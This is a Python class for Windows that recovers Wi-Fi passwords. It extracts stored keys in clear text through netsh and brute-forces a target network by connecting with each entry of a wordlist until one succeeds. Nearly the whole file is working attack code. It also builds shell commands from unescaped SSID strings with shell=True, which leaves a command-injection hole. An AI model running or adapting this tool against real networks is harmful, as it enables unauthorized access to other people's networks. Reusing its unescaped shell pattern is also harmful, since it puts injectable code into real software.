import subprocess
import os
import time
import tempfile

class WiFiPasswordFinder:
    def __init__(self):
        self.finding = False
        self.password_found = None
        self.callback = None
        self.tested = 0
        self.total = 0

    def set_callback(self, callback):
        self.callback = callback

    def update_status(self, message, level="info", current=None, total=None, current_word=""):
        if self.callback:
            self.callback(message, level, current, total, current_word)

    def get_current_wifi(self):
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True, encoding='utf-8')
            for line in result.stdout.split('\n'):
                if 'SSID' in line and ':' in line:
                    ssid = line.split(':')[1].strip()
                    if ssid and ssid != '' and ssid != ' ':
                        return ssid
        except:
            pass
        return None

    def find_saved_password(self, ssid):
        try:
            result = subprocess.run(f'netsh wlan show profile name="{ssid}" key=clear', shell=True, capture_output=True, text=True, encoding='utf-8')
            for line in result.stdout.split('\n'):
                if 'Key Content' in line:
                    password = line.split(':')[1].strip()
                    if password and password != '':
                        return password
                elif 'محتوای کلید' in line:
                    password = line.split(':')[1].strip()
                    if password and password != '':
                        return password
            return None
        except:
            return None

    def test_password_on_network(self, ssid, password):
        try:
            profile_xml = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
            profile_file = os.path.join(tempfile.gettempdir(), f"temp_wifi_{int(time.time())}.xml")
            with open(profile_file, 'w', encoding='utf-8') as f:
                f.write(profile_xml)
            subprocess.run(f'netsh wlan add profile filename="{profile_file}"', shell=True, capture_output=True, timeout=5)
            subprocess.run(f'netsh wlan connect name="{ssid}"', shell=True, capture_output=True, timeout=10)
            time.sleep(2)
            status = subprocess.run('netsh wlan show interfaces', shell=True, capture_output=True, text=True, encoding='utf-8')
            is_connected = any(ssid in line for line in status.stdout.split('\n') if 'SSID' in line)
            subprocess.run(f'netsh wlan delete profile name="{ssid}"', shell=True, capture_output=True)
            if os.path.exists(profile_file):
                os.remove(profile_file)
            return is_connected
        except:
            return False

    def find_password_from_wordlist(self, ssid, wordlist_file):
        if not os.path.exists(wordlist_file):
            self.update_status("❌ Wordlist not found", "error")
            return None
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except:
            self.update_status("❌ Could not read wordlist", "error")
            return None
        if not passwords:
            self.update_status("❌ Wordlist is empty", "error")
            return None
        self.total = len(passwords)
        self.finding = True
        self.password_found = None
        self.tested = 0
        self.update_status(f"🎯 Target: {ssid}", "info")
        self.update_status(f"📊 Total passwords: {self.total:,}", "info")
        for i, password in enumerate(passwords):
            if not self.finding:
                break
            self.tested = i + 1
            if i % 10 == 0 or i < 10:
                percent = (self.tested / self.total) * 100
                self.update_status(f"⏳ Testing {self.tested:,} of {self.total:,} ({percent:.1f}%) | Password: {password[:15]}...", "info", self.tested, self.total, password)
            if self.test_password_on_network(ssid, password):
                self.password_found = password
                self.update_status(f"✅✅✅ Password found: {password} ✅✅✅", "success")
                break
        if not self.password_found and self.finding:
            self.update_status("❌ Password not found in wordlist", "error")
        self.finding = False
        return self.password_found

    def stop_finding(self):
        self.finding = False
        self.update_status("⏹ Stopped by user", "warning")